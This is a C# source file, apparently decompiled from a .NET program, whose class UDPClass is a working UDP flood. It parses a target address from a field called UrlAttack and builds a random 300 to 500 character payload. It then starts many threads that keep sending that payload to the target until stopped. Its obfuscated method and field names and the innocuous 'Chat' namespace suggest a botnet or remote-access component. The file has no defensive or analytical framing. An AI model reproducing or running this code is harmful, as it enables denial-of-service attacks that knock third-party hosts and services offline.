namespace Chat
{
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.Net;
    using System.Net.Sockets;
    using System.Text;
    using System.Threading;

    public class UDPClass
    {
        public static IPAddress gJxoQtg9XoE9ngXHYzPO7RB7jFWPu2WL;
        public static bool IsAlive;
        public static byte[] PacketBytes = new byte[0];
        public static int PackteSize;
        public static int Threads;
        public static UdpClient UDPEntryPoint = new UdpClient();
        public static string UrlAttack;

        public static void CheckStatus()
        {
            if (IsAlive)
            {
                IsAlive = false;
            }
        }

        public static void ia51JnOf1lhbPpspOfWxXHdILMWHwy9m()
        {
            while (IsAlive)
            {
                try
                {
                    UDPEntryPoint.Connect(gJxoQtg9XoE9ngXHYzPO7RB7jFWPu2WL, PackteSize);
                    UDPEntryPoint.Send(PacketBytes, PacketBytes.Length);
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    ProjectData.ClearProjectError();
                }
            }
            Thread.CurrentThread.Abort();
        }

        public static string RandomString()
        {
            Random random = new Random();
            string str = "";
            string str2 = "qwertyuioplkjhgfdsazxcvbnm";
            string str3 = "QWERTYUIOPLKJHGFDSAZXCVBNM";
            string str4 = "0123456789";
            string str5 = "!�$%^&*()-_=+]}{[;:'@#~<,.>/?";
            int num2 = random.Next(300, 500);
            for (int i = 0; i <= num2; i++)
            {
                switch (random.Next(0, 4))
                {
                    case 0:
                        str = str + Conversions.ToString(str2.ToCharArray()[random.Next(random.Next(0, 0x1a))]);
                        break;

                    case 1:
                        str = str + Conversions.ToString(str3.ToCharArray()[random.Next(0, 0x1a)]);
                        break;

                    case 2:
                        str = str + Conversions.ToString(str4.ToCharArray()[random.Next(0, 10)]);
                        break;

                    case 3:
                        str = str + Conversions.ToString(str5.ToCharArray()[random.Next(0, 0x1d)]);
                        break;
                }
            }
            return str;
        }

        public static void Start()
        {
            if (!IsAlive)
            {
                IsAlive = true;
                PacketBytes = Encoding.ASCII.GetBytes(RandomString());
                gJxoQtg9XoE9ngXHYzPO7RB7jFWPu2WL = IPAddress.Parse(UrlAttack);
                int threads = Threads;
                for (int i = 0; i <= threads; i++)
                {
                    new Thread(new ThreadStart(UDPClass.ia51JnOf1lhbPpspOfWxXHdILMWHwy9m)).Start();
                }
            }
        }
    }
}

